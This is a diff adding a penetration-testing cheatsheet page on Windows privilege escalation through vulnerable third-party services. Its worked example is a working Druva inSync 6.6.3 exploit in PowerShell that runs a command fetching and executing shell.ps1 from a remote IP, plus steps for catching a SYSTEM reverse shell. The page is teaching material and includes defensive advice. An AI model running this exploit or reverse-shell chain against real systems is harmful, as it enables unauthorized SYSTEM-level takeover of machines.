@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Vulnerable Services · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>Vulnerable Services</h1><p class="cx-lede">Escalating through known-vulnerable third-party software rather than misconfiguration - enumerate installed programs and their versions, map locally-listening services, match a version to a public LPE exploit, and run the PoC. Walks the Druva inSync 6.6.3 localhost-RPC command injection as the canonical example of a client application whose SYSTEM service is reachable from an unprivileged shell.</p><div class="cx-tags"><span class="cx-tag">MITRE T1203, T1068, T1543.003</span><span class="cx-tag">D3FEND D3-PA</span><span class="cx-tag">IMPACT PrivEsc, SystemCompromise</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>A fully-patched, well-configured Windows box can still be escalated through <strong>third-party software</strong> - installed applications and their services often run as SYSTEM and carry their own vulnerabilities. The workflow: list installed programs with versions, confirm the service is running (often on a localhost port), match the version to a public exploit, run it.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. What&#x27;s installed, with versions (prefer the registry - see caution below)
+Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select DisplayName, DisplayVersion
+
+# 2. What&#x27;s listening locally (SYSTEM services often bind 127.0.0.1)
+netstat -ano | findstr LISTENING
+get-process -Id &lt;PID&gt;                 # map a suspicious port&#x27;s PID back to a product
+
+# 3. Match a version to a known LPE
+searchsploit &lt;product&gt; &lt;version&gt;      # or exploit-db / vendor advisories
+
+# 4. Run the PoC (example: Druva inSync 6.6.3, RPC on 127.0.0.1:6064)</code></pre></figure>
+<p>Success indicator: the PoC runs your command in the vulnerable service's context - <code>whoami</code> returns <code>nt authority\system</code>.</p>
+<h2 id="when-this-applies">When this applies</h2>
+<p>This is the path when the privilege/group checks and the ACL audit come up empty but the host runs non-Microsoft software - very common on real workstations and app servers. Two things make it productive:</p>
+<ul>
+<li><strong>Client apps ship local SYSTEM services.</strong> Backup agents, VPN clients, EDR, "helper" services - they install a SYSTEM-context service that frequently exposes a control channel on a loopback port, assuming "localhost = trusted."</li>
+<li><strong>Users are allowed to install software.</strong> Every unvetted install is new attack surface the organization didn't threat-model.</li>
+</ul>
+<h2 id="enumerate-installed-software">Enumerate installed software</h2>
+<p>The uninstall registry keys are the safe primary source - fast, and read-only:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;, `
+                 &quot;HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; |
+  select DisplayName, DisplayVersion, Publisher | sort DisplayName</code></pre></figure>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Avoid <code>wmic product get</code> / <code>Get-CimInstance Win32_Product</code> for inventory. Querying <code>Win32_Product</code> makes Windows Installer run a <strong>consistency check on every MSI-installed product</strong>, which can silently trigger repairs and <em>modify the host during enumeration</em> - exactly what you don't want on a client machine you're assessing. It's also slow and only sees MSI installs. The registry keys above cover more, faster, without touching anything.</p>
+</div>
+<p>Anything non-standard - a backup client, a VPN, a vendor "service" - is a lead. Note the <strong>exact version</strong>; LPEs are version-pinned.</p>
+<h2 id="confirm-the-service-and-map-it">Confirm the service and map it</h2>
+<p>A locally-listening port with no obvious owner is the tell. Map it back to a process and then to a product:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>netstat -ano | findstr 6064
+#  TCP  127.0.0.1:6064  0.0.0.0:0  LISTENING  3324
+get-process -Id 3324
+#  ProcessName: inSyncCPHwnet64
+get-service | ? {$_.DisplayName -like &#x27;Druva*&#x27;}
+#  Running  inSyncCPHService  Druva inSync Client Service</code></pre></figure>
+<h2 id="worked-example-druva-insync-663">Worked example - Druva inSync 6.6.3</h2>
+<p>The uninstall-key enumeration shows <code>Druva inSync 6.6.3</code> installed. That version's client service (SYSTEM) exposes an RPC endpoint on <code>127.0.0.1:6064</code> that is vulnerable to command injection (<a href="https://www.exploit-db.com/exploits/49211">exploit-db 49211</a>) - any local user can reach it and run commands as SYSTEM. The PoC is a short PowerShell snippet that frames an RPC message carrying a command:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">$cmd = &quot;powershell IEX(New-Object Net.Webclient).downloadString(&#x27;http://10.10.14.140:8080/shell.ps1&#x27;)&quot;
+$s = New-Object System.Net.Sockets.Socket(&#x27;InterNetwork&#x27;,&#x27;Stream&#x27;,&#x27;Tcp&#x27;)
+$s.Connect(&quot;127.0.0.1&quot;, 6064)
+$header  = [Text.Encoding]::UTF8.GetBytes(&quot;inSync PHC RPCW[v0002]&quot;)
+$rpcType = [Text.Encoding]::UTF8.GetBytes(&quot;$([char]0x0005)`0`0`0&quot;)
+$command = [Text.Encoding]::Unicode.GetBytes(&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd&quot;)
+$length  = [BitConverter]::GetBytes($command.Length)
+$s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)</code></pre></figure>
+<p>Host <code>shell.ps1</code> (e.g. Nishang's <code>Invoke-PowerShellTcp</code> with a reverse-shell line appended) on a Python web server, start a listener, and run the PoC on the target (set <code>Set-ExecutionPolicy Bypass -Scope Process</code> if needed). The callback returns as <code>nt authority\system</code>. Prefer an in-memory reverse shell over <code>net user /add</code> - quieter, and it avoids changing state on a client machine.</p>
+<h2 id="general-workflow">General workflow</h2>
+<ol>
+<li><strong>Inventory</strong> installed software and versions (above).</li>
+<li><strong>Research</strong> each non-standard product: <code>searchsploit</code>, Exploit-DB, the vendor's security advisories, GitHub. Look specifically for "local privilege escalation", "RPC", "named pipe", "service".</li>
+<li><strong>Confirm</strong> the vulnerable component is actually present and running (version <em>and</em> the listening service/pipe).</li>
+<li><strong>Run the PoC</strong> - but read it first. Public LPE PoCs often add a local admin or drop a file; adapt them to an in-memory payload and understand what they change before firing on a client system.</li>
+</ol>
+<h2 id="defense">Defense</h2>
+<ul>
+<li>Enforce least privilege: don't let standard users install software; maintain an application allowlist.</li>
+<li>Patch third-party software on the same cadence as the OS - LPEs in agents/clients are as serious as OS bugs because the agent runs as SYSTEM.</li>
+<li>Services that only need local IPC should bind to a named pipe with a tight ACL, not an unauthenticated loopback TCP port.</li>
+<li>Inventory installed software centrally so a vulnerable version is visible before an attacker finds it.</li>
+</ul>
+<h2 id="related">Related</h2>
+<ul>
+<li><a href="../initial-enumeration/index.html">Initial enumeration</a> - installed-software and patch enumeration that feeds this</li>
+<li><a href="../situational-awareness/index.html">Situational awareness</a> - spotting locally-bound services worth probing</li>
+<li><a href="../weak-permissions/index.html">Weak service &amp; registry permissions</a> - escalation through misconfiguration rather than a code vulnerability</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../weak-permissions/index.html">Previous: Weak Service &amp; Registry Permissions</a><a class="cx-next" href="../dll-hijacking/index.html">Next: DLL Hijacking</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
